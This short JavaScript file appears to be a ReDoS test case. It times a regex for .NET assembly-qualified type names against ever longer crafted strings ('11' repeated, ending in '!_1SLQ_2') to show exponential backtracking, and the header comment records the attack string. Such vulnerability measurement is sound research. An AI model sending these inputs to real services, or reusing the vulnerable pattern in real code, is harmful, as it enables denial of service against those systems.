/* 8631
 * ^(?<type>(\w+(\.?\w+)+))\s*,\s*(?<assembly>[\w\.]+)(,\s?Version=(?<version>\d+\.\d+\.\d+\.\d+))?(,\s?Culture=(?<culture>\w+))?(,\s?PublicKeyToken=(?<token>\w+))?$
 * EXPONENT
 * nums:3
 * EXPONENT AttackString:""+"11"*16+"!_1SLQ_2"
 */
var REGEX = /^(?<type>(\w+(\.?\w+)+))\s*,\s*(?<assembly>[\w\.]+)(,\s?Version=(?<version>\d+\.\d+\.\d+\.\d+))?(,\s?Culture=(?<culture>\w+))?(,\s?PublicKeyToken=(?<token>\w+))?$/
for(var i = 1; i <= 5000000; i++) {
    var time = Date.now();
    var attack_str = '' + '11'.repeat(i*1) + '!_1SLQ_2'
    REGEX.exec(attack_str)
    // REGEX.test(attack_str);
    // attack_str.search(REGEX)
    // attack_str.match(REGEX)
    var time_cost = Date.now() - time;
    console.log(i * 1 + ": " + time_cost+" ms")
}